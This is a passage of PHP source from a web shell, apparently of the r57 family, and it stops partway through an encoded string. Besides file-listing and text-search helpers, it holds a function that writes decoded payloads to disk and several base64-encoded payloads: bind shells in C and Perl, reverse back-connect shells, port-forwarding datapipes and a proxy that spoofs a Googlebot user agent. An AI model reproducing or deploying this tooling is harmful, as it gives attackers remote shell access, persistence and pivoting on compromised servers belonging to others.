$owner["read"] = ($mode & 00400) ? 'r' : '-';
$owner["write"] = ($mode & 00200) ? 'w' : '-';
$owner["execute"] = ($mode & 00100) ? 'x' : '-';
$group["read"] = ($mode & 00040) ? 'r' : '-';
$group["write"] = ($mode & 00020) ? 'w' : '-';
$group["execute"] = ($mode & 00010) ? 'x' : '-';
$world["read"] = ($mode & 00004) ? 'r' : '-';
$world["write"] = ($mode & 00002) ? 'w' : '-';
$world["execute"] = ($mode & 00001) ? 'x' : '-';
if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
$s=sprintf("%1s", $type);
$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
return trim($s);
}
function in($type,$name,$size,$value,$checked=0)
{
 $ret = "<input type=".$type." name=".$name." ";
 if($size != 0) { $ret .= "size=".$size." "; }
 $ret .= "value=\"".$value."\"";
 if($checked) $ret .= " checked";
 return $ret.">";
}
function which($pr)
{
$path = '';
$path = ex("which $pr");
if(!empty($path)) { return $path; } else { return false; }
}
function cf($fname,$text)
{
 $w_file=@fopen($fname,"w") or @function_exists('file_put_contents') or err(0);
 if($w_file)
 {
 @fwrite($w_file,@base64_decode($text)) or @fputs($w_file,@base64_decode($text)) or @file_put_contents($fname,@base64_decode($text));
 @fclose($w_file);
 }
}
function sr($l,$t1,$t2)
 {
 return "<tr class=tr1><td class=td1 width=".$l."% align=right>".$t1."</td><td class=td1 align=left>".$t2."</td></tr>";
 }
if (!@function_exists("view_size"))
{
function view_size($size)
{
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}
}
  function DirFilesR($dir,$types='')
  {
    $files = Array();
    if(($handle = @opendir($dir)) || (@function_exists('scandir')))
    {
      while ((false !== ($file = @readdir($handle))) && (false !== ($file = @scandir($dir))))
      {
        if ($file != "." && $file != "..")
        {
          if(@is_dir($dir."/".$file))
            $files = @array_merge($files,DirFilesR($dir."/".$file,$types));
          else
          {
            $pos = @strrpos($file,".");
            $ext = @substr($file,$pos,@strlen($file)-$pos);
            if($types)
            {
              if(@in_array($ext,explode(';',$types)))
                $files[] = $dir."/".$file;
            }
            else
              $files[] = $dir."/".$file;
          }
        }
      }
      @closedir($handle);
    }
    return $files;
  }
  class SearchResult
  {
    var $text;
    var $FilesToSearch;
    var $ResultFiles;
    var $FilesTotal;
    var $MatchesCount;
    var $FileMatschesCount;
    var $TimeStart;
    var $TimeTotal;
    var $titles;
    function SearchResult($dir,$text,$filter='')
    {
      $dirs = @explode(";",$dir);
      $this->FilesToSearch = Array();
      for($a=0;$a<count($dirs);$a++)
        $this->FilesToSearch = @array_merge($this->FilesToSearch,DirFilesR($dirs[$a],$filter));
      $this->text = $text;
      $this->FilesTotal = @count($this->FilesToSearch);
      $this->TimeStart = getmicrotime();
      $this->MatchesCount = 0;
      $this->ResultFiles = Array();
      $this->FileMatchesCount = Array();
      $this->titles = Array();
    }
    function GetFilesTotal() { return $this->FilesTotal; }
    function GetTitles() { return $this->titles; }
    function GetTimeTotal() { return $this->TimeTotal; }
    function GetMatchesCount() { return $this->MatchesCount; }
    function GetFileMatchesCount() { return $this->FileMatchesCount; }
    function GetResultFiles() { return $this->ResultFiles; }
    function SearchText($phrase=0,$case=0) {
    $qq = @explode(' ',$this->text);
    $delim = '|';
      if($phrase)
        foreach($qq as $k=>$v)
          $qq[$k] = '\b'.$v.'\b';
      $words = '('.@implode($delim,$qq).')';
      $pattern = "/".$words."/";
      if(!$case)
        $pattern .= 'i';
      foreach($this->FilesToSearch as $k=>$filename)
      {
        $this->FileMatchesCount[$filename] = 0;
        $FileStrings = @file($filename) or @next;
        for($a=0;$a<@count($FileStrings);$a++)
        {
          $count = 0;
          $CurString = $FileStrings[$a];
          $CurString = @Trim($CurString);
          $CurString = @strip_tags($CurString);
          $aa = '';
          if(($count = @preg_match_all($pattern,$CurString,$aa)))
          {
            $CurString = @preg_replace($pattern,"<SPAN style='color: #990000;'><b>\\1</b></SPAN>",$CurString);
            $this->ResultFiles[$filename][$a+1] = $CurString;
            $this->MatchesCount += $count;
            $this->FileMatchesCount[$filename] += $count;
          }
        }
      }
      $this->TimeTotal = @round(getmicrotime() - $this->TimeStart,4);
    }
  }
  function getmicrotime()
  {
    list($usec,$sec) = @explode(" ",@microtime());
    return ((float)$usec + (float)$sec);
  }
$port_bind_bd_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZS
A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I
GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt
b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9
pKGFyZ3ZbMV0pKTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7IA0KIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULF
NPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgK
ikmcmVtb3RlLCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB7DQogICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7DQog
ICBkdXAyKG5ld2ZkLDApOw0KICAgZHVwMihuZXdmZCwxKTsNCiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ6IiwxMCk
7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2
9tZSB0byByNTcgc2hlbGwgJiYgL2Jpbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGNsb3NlKG5ld
2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW50ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVu
dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp
lbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCkpDQpyZXR1cm4gMDsNCn0=";
$port_bind_bd_pl="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZiAoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMS
VNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORVQs
JlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVV
TRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw0KbG
lzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCmFjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspK
Q0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4i
Ow0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3N
lIENPTk47DQpleGl0IDA7DQp9DQp9";
$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC
BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb
SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd
KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ
sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC
Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D
QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp
Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
$datapipe_c="I2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvd2FpdC5oPg0KI2luY2
x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jb
HVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxsaW51eC90aW1lLmg+DQojaWZkZWYgU1RSRVJST1INCmV4dGVybiBj
aGFyICpzeXNfZXJybGlzdFtdOw0KZXh0ZXJuIGludCBzeXNfbmVycjsNCmNoYXIgKnVuZGVmID0gIlVuZGVmaW5lZCBlcnJvciI7DQpjaGFyICpzdHJ
lcnJvcihlcnJvcikgIA0KaW50IGVycm9yOyAgDQp7IA0KaWYgKGVycm9yID4gc3lzX25lcnIpDQpyZXR1cm4gdW5kZWY7DQpyZXR1cm4gc3lzX2Vycm
xpc3RbZXJyb3JdOw0KfQ0KI2VuZGlmDQoNCm1haW4oYXJnYywgYXJndikgIA0KICBpbnQgYXJnYzsgIA0KICBjaGFyICoqYXJndjsgIA0KeyANCiAga
W50IGxzb2NrLCBjc29jaywgb3NvY2s7DQogIEZJTEUgKmNmaWxlOw0KICBjaGFyIGJ1Zls0MDk2XTsNCiAgc3RydWN0IHNvY2thZGRyX2luIGxhZGRy
LCBjYWRkciwgb2FkZHI7DQogIGludCBjYWRkcmxlbiA9IHNpemVvZihjYWRkcik7DQogIGZkX3NldCBmZHNyLCBmZHNlOw0KICBzdHJ1Y3QgaG9zdGV
udCAqaDsNCiAgc3RydWN0IHNlcnZlbnQgKnM7DQogIGludCBuYnl0Ow0KICB1bnNpZ25lZCBsb25nIGE7DQogIHVuc2lnbmVkIHNob3J0IG9wb3J0Ow
0KDQogIGlmIChhcmdjICE9IDQpIHsNCiAgICBmcHJpbnRmKHN0ZGVyciwiVXNhZ2U6ICVzIGxvY2FscG9ydCByZW1vdGVwb3J0IHJlbW90ZWhvc3Rcb
iIsYXJndlswXSk7DQogICAgcmV0dXJuIDMwOw0KICB9DQogIGEgPSBpbmV0X2FkZHIoYXJndlszXSk7DQogIGlmICghKGggPSBnZXRob3N0YnluYW1l
KGFyZ3ZbM10pKSAmJg0KICAgICAgIShoID0gZ2V0aG9zdGJ5YWRkcigmYSwgNCwgQUZfSU5FVCkpKSB7DQogICAgcGVycm9yKGFyZ3ZbM10pOw0KICA
gIHJldHVybiAyNTsNCiAgfQ0KICBvcG9ydCA9IGF0b2woYXJndlsyXSk7DQogIGxhZGRyLnNpbl9wb3J0ID0gaHRvbnMoKHVuc2lnbmVkIHNob3J0KS
hhdG9sKGFyZ3ZbMV0pKSk7DQogIGlmICgobHNvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNC
iAgICBwZXJyb3IoInNvY2tldCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBsYWRkci5zaW5fZmFtaWx5ID0gaHRvbnMoQUZfSU5FVCk7DQogIGxh
ZGRyLnNpbl9hZGRyLnNfYWRkciA9IGh0b25sKDApOw0KICBpZiAoYmluZChsc29jaywgJmxhZGRyLCBzaXplb2YobGFkZHIpKSkgew0KICAgIHBlcnJ
vcigiYmluZCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBpZiAobGlzdGVuKGxzb2NrLCAxKSkgew0KICAgIHBlcnJvcigibGlzdGVuIik7DQogIC
AgcmV0dXJuIDIwOw0KICB9DQogIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0gLTEpIHsNCiAgICBwZXJyb3IoImZvcmsiKTsNCiAgICByZXR1cm4gMjA7D
QogIH0NCiAgaWYgKG5ieXQgPiAwKQ0KICAgIHJldHVybiAwOw0KICBzZXRzaWQoKTsNCiAgd2hpbGUgKChjc29jayA9IGFjY2VwdChsc29jaywgJmNh
ZGRyLCAmY2FkZHJsZW4pKSAhPSAtMSkgew0KICAgIGNmaWxlID0gZmRvcGVuKGNzb2NrLCJyKyIpOw0KICAgIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0
gLTEpIHsNCiAgICAgIGZwcmludGYoY2ZpbGUsICI1MDAgZm9yazogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgICBzaHV0ZG93bihjc29jay
wyKTsNCiAgICAgIGZjbG9zZShjZmlsZSk7DQogICAgICBjb250aW51ZTsNCiAgICB9DQogICAgaWYgKG5ieXQgPT0gMCkNCiAgICAgIGdvdG8gZ290c
29jazsNCiAgICBmY2xvc2UoY2ZpbGUpOw0KICAgIHdoaWxlICh3YWl0cGlkKC0xLCBOVUxMLCBXTk9IQU5HKSA+IDApOw0KICB9DQogIHJldHVybiAy
MDsNCg0KIGdvdHNvY2s6DQogIGlmICgob3NvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNCiA
gICBmcHJpbnRmKGNmaWxlLCAiNTAwIHNvY2tldDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICBvYWRkci
5zaW5fZmFtaWx5ID0gaC0+aF9hZGRydHlwZTsNCiAgb2FkZHIuc2luX3BvcnQgPSBodG9ucyhvcG9ydCk7DQogIG1lbWNweSgmb2FkZHIuc2luX2FkZ
HIsIGgtPmhfYWRkciwgaC0+aF9sZW5ndGgpOw0KICBpZiAoY29ubmVjdChvc29jaywgJm9hZGRyLCBzaXplb2Yob2FkZHIpKSkgew0KICAgIGZwcmlu
dGYoY2ZpbGUsICI1MDAgY29ubmVjdDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICB3aGlsZSAoMSkgew0
KICAgIEZEX1pFUk8oJmZkc3IpOw0KICAgIEZEX1pFUk8oJmZkc2UpOw0KICAgIEZEX1NFVChjc29jaywmZmRzcik7DQogICAgRkRfU0VUKGNzb2NrLC
ZmZHNlKTsNCiAgICBGRF9TRVQob3NvY2ssJmZkc3IpOw0KICAgIEZEX1NFVChvc29jaywmZmRzZSk7DQogICAgaWYgKHNlbGVjdCgyMCwgJmZkc3IsI
E5VTEwsICZmZHNlLCBOVUxMKSA9PSAtMSkgew0KICAgICAgZnByaW50ZihjZmlsZSwgIjUwMCBzZWxlY3Q6ICVzXG4iLCBzdHJlcnJvcihlcnJubykp
Ow0KICAgICAgZ290byBxdWl0MjsNCiAgICB9DQogICAgaWYgKEZEX0lTU0VUKGNzb2NrLCZmZHNyKSB8fCBGRF9JU1NFVChjc29jaywmZmRzZSkpIHs
NCiAgICAgIGlmICgobmJ5dCA9IHJlYWQoY3NvY2ssYnVmLDQwOTYpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgICBpZiAoKHdyaXRlKG9zb2NrLG
J1ZixuYnl0KSkgPD0gMCkNCglnb3RvIHF1aXQyOw0KICAgIH0gZWxzZSBpZiAoRkRfSVNTRVQob3NvY2ssJmZkc3IpIHx8IEZEX0lTU0VUKG9zb2NrL
CZmZHNlKSkgew0KICAgICAgaWYgKChuYnl0ID0gcmVhZChvc29jayxidWYsNDA5NikpIDw9IDApDQoJZ290byBxdWl0MjsNCiAgICAgIGlmICgod3Jp
dGUoY3NvY2ssYnVmLG5ieXQpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgfQ0KICB9DQoNCiBxdWl0MjoNCiAgc2h1dGRvd24ob3NvY2ssMik7DQo
gIGNsb3NlKG9zb2NrKTsNCiBxdWl0MToNCiAgZmZsdXNoKGNmaWxlKTsNCiAgc2h1dGRvd24oY3NvY2ssMik7DQogcXVpdDA6DQogIGZjbG9zZShjZm
lsZSk7DQogIHJldHVybiAwOw0KfQ==";
$datapipe_pl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgSU86OlNvY2tldDsNCnVzZSBQT1NJWDsNCiRsb2NhbHBvcnQgPSAkQVJHVlswXTsNCiRob3N0I
CAgICAgPSAkQVJHVlsxXTsNCiRwb3J0ICAgICAgPSAkQVJHVlsyXTsNCiRkYWVtb249MTsNCiRESVIgPSB1bmRlZjsNCiR8ID0gMTsNCmlmICgkZGFl
bW9uKXsgJHBpZCA9IGZvcms7IGV4aXQgaWYgJHBpZDsgZGllICIkISIgdW5sZXNzIGRlZmluZWQoJHBpZCk7IFBPU0lYOjpzZXRzaWQoKSBvciBkaWU
gIiQhIjsgfQ0KJW8gPSAoJ3BvcnQnID0+ICRsb2NhbHBvcnQsJ3RvcG9ydCcgPT4gJHBvcnQsJ3RvaG9zdCcgPT4gJGhvc3QpOw0KJGFoID0gSU86Ol
NvY2tldDo6SU5FVC0+bmV3KCdMb2NhbFBvcnQnID0+ICRsb2NhbHBvcnQsJ1JldXNlJyA9PiAxLCdMaXN0ZW4nID0+IDEwKSB8fCBkaWUgIiQhIjsNC
iRTSUd7J0NITEQnfSA9ICdJR05PUkUnOw0KJG51bSA9IDA7DQp3aGlsZSAoMSkgeyANCiRjaCA9ICRhaC0+YWNjZXB0KCk7IGlmICghJGNoKSB7IHBy
aW50IFNUREVSUiAiJCFcbiI7IG5leHQ7IH0NCisrJG51bTsNCiRwaWQgPSBmb3JrKCk7DQppZiAoIWRlZmluZWQoJHBpZCkpIHsgcHJpbnQgU1RERVJ
SICIkIVxuIjsgfSANCmVsc2lmICgkcGlkID09IDApIHsgJGFoLT5jbG9zZSgpOyBSdW4oXCVvLCAkY2gsICRudW0pOyB9IA0KZWxzZSB7ICRjaC0+Y2
xvc2UoKTsgfQ0KfQ0Kc3ViIFJ1biB7DQpteSgkbywgJGNoLCAkbnVtKSA9IEBfOw0KbXkgJHRoID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KCdQZWVyQ
WRkcicgPT4gJG8tPnsndG9ob3N0J30sJ1BlZXJQb3J0JyA9PiAkby0+eyd0b3BvcnQnfSk7DQppZiAoISR0aCkgeyBleGl0IDA7IH0NCm15ICRmaDsN
CmlmICgkby0+eydkaXInfSkgeyAkZmggPSBTeW1ib2w6OmdlbnN5bSgpOyBvcGVuKCRmaCwgIj4kby0+eydkaXInfS90dW5uZWwkbnVtLmxvZyIpIG9
yIGRpZSAiJCEiOyB9DQokY2gtPmF1dG9mbHVzaCgpOw0KJHRoLT5hdXRvZmx1c2goKTsNCndoaWxlICgkY2ggfHwgJHRoKSB7DQpteSAkcmluID0gIi
I7DQp2ZWMoJHJpbiwgZmlsZW5vKCRjaCksIDEpID0gMSBpZiAkY2g7DQp2ZWMoJHJpbiwgZmlsZW5vKCR0aCksIDEpID0gMSBpZiAkdGg7DQpteSgkc
m91dCwgJGVvdXQpOw0Kc2VsZWN0KCRyb3V0ID0gJHJpbiwgdW5kZWYsICRlb3V0ID0gJHJpbiwgMTIwKTsNCmlmICghJHJvdXQgICYmICAhJGVvdXQp
IHt9DQpteSAkY2J1ZmZlciA9ICIiOw0KbXkgJHRidWZmZXIgPSAiIjsNCmlmICgkY2ggJiYgKHZlYygkZW91dCwgZmlsZW5vKCRjaCksIDEpIHx8IHZ
lYygkcm91dCwgZmlsZW5vKCRjaCksIDEpKSkgew0KbXkgJHJlc3VsdCA9IHN5c3JlYWQoJGNoLCAkdGJ1ZmZlciwgMTAyNCk7DQppZiAoIWRlZmluZW
QoJHJlc3VsdCkpIHsNCnByaW50IFNUREVSUiAiJCFcbiI7DQpleGl0IDA7DQp9DQppZiAoJHJlc3VsdCA9PSAwKSB7IGV4aXQgMDsgfQ0KfQ0KaWYgK
CR0aCAgJiYgICh2ZWMoJGVvdXQsIGZpbGVubygkdGgpLCAxKSAgfHwgdmVjKCRyb3V0LCBmaWxlbm8oJHRoKSwgMSkpKSB7DQpteSAkcmVzdWx0ID0g
c3lzcmVhZCgkdGgsICRjYnVmZmVyLCAxMDI0KTsNCmlmICghZGVmaW5lZCgkcmVzdWx0KSkgeyBwcmludCBTVERFUlIgIiQhXG4iOyBleGl0IDA7IH0
NCmlmICgkcmVzdWx0ID09IDApIHtleGl0IDA7fQ0KfQ0KaWYgKCRmaCAgJiYgICR0YnVmZmVyKSB7KHByaW50ICRmaCAkdGJ1ZmZlcik7fQ0Kd2hpbG
UgKG15ICRsZW4gPSBsZW5ndGgoJHRidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJHRoLCAkdGJ1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+I
DApIHskdGJ1ZmZlciA9IHN1YnN0cigkdGJ1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfQ0Kd2hpbGUgKG15ICRs
ZW4gPSBsZW5ndGgoJGNidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJGNoLCAkY2J1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+IDApIHskY2J
1ZmZlciA9IHN1YnN0cigkY2J1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfX19DQo=";
$prx_pl="IyF1c3IvYmluL3BlcmwKdXNlIFNvY2tldDsKbXkgJHBvcnQgPSAkQVJHVlswXXx8MzEzMzc7Cm15ICRwcm90b2NvbCA9IGdldHByb3RvYn
luYW1lKCd0Y3AnKTsKbXkgJG15X2FkZHIgID0gc29ja2FkZHJfaW4gKCRwb3J0LCBJTkFERFJfQU5ZKTsKc29ja2V0IChTT0NLLCBBRl9JTkVULCBTT
0NLX1NUUkVBTSwgJHByb3RvY29sKSBvciBkaWUgInNvY2tldCgpOiAkISI7CnNldHNvY2tvcHQgKFNPQ0ssIFNPTF9TT0NLRVQsIFNPX1JFVVNFQURE
UiwxICkgb3IgZGllICJzZXRzb2Nrb3B0KCk6ICQhIjsKYmluZCAoU09DSywgJG15X2FkZHIpIG9yIGRpZSAiYmluZCgpOiAkISI7Cmxpc3RlbiAoU09
DSywgU09NQVhDT05OKSBvciBkaWUgImxpc3RlbigpOiAkISI7CiRTSUd7J0lOVCd9ID0gc3ViIHsKY2xvc2UgKFNPQ0spOwpleGl0Owp9Owp3aGlsZS
AoMSkgewpuZXh0IHVubGVzcyBteSAkcmVtb3RlX2FkZHIgPSBhY2NlcHQgKFNFU1NJT04sIFNPQ0spOwpteSAoJGZpc3QsICRtZXRob2QsICRyZW1vd
GVfaG9zdCwgJHJlbW90ZV9wb3J0KSA9IGFuYWx5emVfcmVxdWVzdCgpOwppZihvcGVuX2Nvbm5lY3Rpb24gKFJFTU9URSwgJHJlbW90ZV9ob3N0LCAk
cmVtb3RlX3BvcnQpID09IDApIHsKY2xvc2UgKFNFU1NJT04pOwpuZXh0Owp9CnByaW50IFJFTU9URSAkZmlyc3Q7CnByaW50IFJFTU9URSAiVXNlci1
BZ2VudDogR29vZ2xlYm90LzIuMSAoK2h0dHA6Ly93d3cuZ29vZ2xlLmNvbS9ib3QuaHRtbClcbiI7CndoaWxlICg8U0VTU0lPTj4pIHsKbmV4dCBpZi
AoL1Byb3h5LUNvbm5lY3Rpb246LyB8fCAvVXNlci1BZ2VudDovKTsKcHJpbnQgUkVNT1RFICRfOwpsYXN0IGlmICgkXyA9fiAvXltcc1x4MDBdKiQvK
TsKfQpwcmludCBSRU1PVEUgIlxuIjsKJGhlYWRlciA9IDE7CndoaWxlICg8UkVNT1RFPikgewpwcmludCBTRVNTSU9OICRfOwppZiAoJGhlYWRlcikg
eyAgICAgCmlmICgkaGVhZGVyICYmICRfID1+IC9eW1xzXHgwMF0qJC8pIHsKJGhlYWRlciA9IDA7Cn0KfQp9CmNsb3NlIChSRU1PVEUpOwpjbG9zZSA
oU0VTU0lPTik7Cn0KY2xvc2UgKFNPQ0spOwpzdWIgYW5hbHl6ZV9yZXF1ZXN0IHsKbXkgKCRmaXN0LCAkdXJsLCAkcmVtb3RlX2hvc3QsICRyZW1vdG
VfcG9ydCwgJG1ldGhvZCk7CiRmaXJzdCA9IDxTRVNTSU9OPjsKJHVybCA9ICgkZmlyc3QgPX4gbXwoaHR0cDovL1xTKyl8KVswXTsKKCRtZXRob2QsI
CRyZW1vdGVfaG9zdCwgJHJlbW90ZV9wb3J0KSA9IAooJGZpcnN0ID1+IG0hKEdFVCkgaHR0cDovLyhbXi86XSspOj8oXGQqKSEgKTsKaWYgKCEkcmVt
b3RlX2hvc3QpIHsKY2xvc2UoU0VTU0lPTik7CmV4aXQ7Cn0KJHJlbW90ZV9wb3J0ID0gImh0dHAiIHVubGVzcyAoJHJlbW90ZV9wb3J0KTsKJGZpcnN
0ID1+IHMvaHR0cDpcL1wvW15cL10rLy87CnJldHVybiAoJGZpcnN0LCAkbWV0aG9kLCAkcmVtb3RlX2hvc3QsICRyZW1vdGVfcG9ydCk7Cn0Kc3ViIG
9wZW5fY29ubmVjdGlvbiB7Cm15ICgkaG9zdCwgJHBvcnQpID0gQF9bMSwyXTsKbXkgKCRkZXN0X2FkZHIsICRjdXIpOwppZiAoJHBvcnQgIX4gL15cZ
